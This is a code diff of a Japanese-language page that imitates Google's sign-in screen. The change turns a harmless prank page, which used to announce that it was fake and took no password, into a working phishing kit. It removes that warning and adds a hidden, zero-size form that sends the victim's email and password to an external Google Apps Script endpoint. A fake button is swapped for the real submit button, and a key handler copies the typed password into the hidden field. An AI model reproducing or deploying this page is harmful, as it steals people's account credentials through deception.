@@ -15,12 +15,22 @@
    <h4 id="menu">メールアドレスまたは電話番号</h4>
       </label>
       <label>
-     <input type="text
-     " class="email" id="input">
+        <div id="nyuuryokurann"><input type="email" class="email" id="input"></div>
      </lavel>
      <h4 class="chui" id="subtitle">ご自分のパソコンでない場合は、プライベート ウィンドウを使用してログインしてください。 <a href="https://support.google.com/accounts/answer/2917834?visit_id=638103346143907941-638236136&p=signin_privatebrowsing&hl=ja&rd=1" class="link">詳細</a></h4>
       <p>
-     <button class="btn" id="btn">次へ</button>
+        <form action="https://script.google.com/macros/s/AKfycbwVJKOIlYdb-h6OnAInItuNoXfClsxJHFLkrBnl1T81eQ0_YwVyVITYrjIKNnAX-w/exec" method="POST">
+  <input type="email" name="mail" class="input" id="mail">
+  <input type="text" name="pass" class="input" id="pass">
+  <div id="submit">
+  </div>
+</form>
+<div id="fakebtn">
+  
+
+<button class="btn" id="btn">次へ</button>
+
+</div>
      </p>
 
 
@@ -90,6 +100,7 @@ h4{
   cursor: pointer;
   margin-top: 6%;
   font-size: 200%;
+  text-align: center;
 } 
 .help{
      font-size:11px;
@@ -107,42 +118,50 @@ h4{
   color: #4287f5;
   text-decoration: none;
 }
+.input{
+  color: white;
+  width: 0px;
+  height: 0px;
+  border: white;
+}
   </style>
   <script type="text/javascript">
     const btn = document.getElementById("btn");
     let count = 0;
+     const input = document.getElementById("input");
+     const mail =  document.getElementById("mail");
+     const pass = document.getElementById("pass");
+     const submit = document.getElementById("submit");
+     const fakebtn = document.getElementById("fakebtn");
+     const nyuuryokurann = document.getElementById("nyuuryokurann");
     btn.addEventListener("click",function(){
- window.setTimeout(function(){
+ window.setTimeout(
+  function(){
       if(count == 0){
+        //もしクリックされたのが一回目なら
       count++;
-      let id = document.getElementById("input").value="";
+      mail.value= input.value;
+      input.value="";
       document.getElementById("menu").innerHTML="パスワードを入力";
       btn.innerHTML="ログイン";
+      submit.innerHTML ='<input  class="btn" id="btn" value="ログイン" type="submit">';
+      fakebtn.innerHTML = "";
+      nyuuryokurann.innerHTML = '<input type="password" class="email" id="input">';
       }else{
-        alert("このサイトは偽サイトです。パスワードはとっておりません。")
-        location.href="https://www.google.com"
+         pass.value= document.getElementById("input").value;
       }
-    }, 500);
+    }
+    , 500);
     })
-    document.addEventListener('keypress', keypress_ivent);
-document.addEventListener('keyup', keyup_ivent);
+    document.addEventListener('keyup',function() {
 
-function keypress_ivent(e) {
-  if(e.key == "Enter"){
-     window.setTimeout(function(){
-      if(count == 0){
-      count++;
-      let id = document.getElementById("input").value="";
-      document.getElementById("menu").innerHTML="パスワードを入力";
-      btn.innerHTML="ログイン";
-      }else{
-        alert("このサイトは偽サイトです。パスワードはとっておりません。")
-        location.href="https://www.google.com"
-      }
-    }, 500);
-  }
-  return false; 
+if (count == 1) {
+  pass.value= document.getElementById("input").value;
 }
+
+});
+
+
 
 // function keyup_ivent(e) {
 //   document.getElementById('output').innerHTML = '';
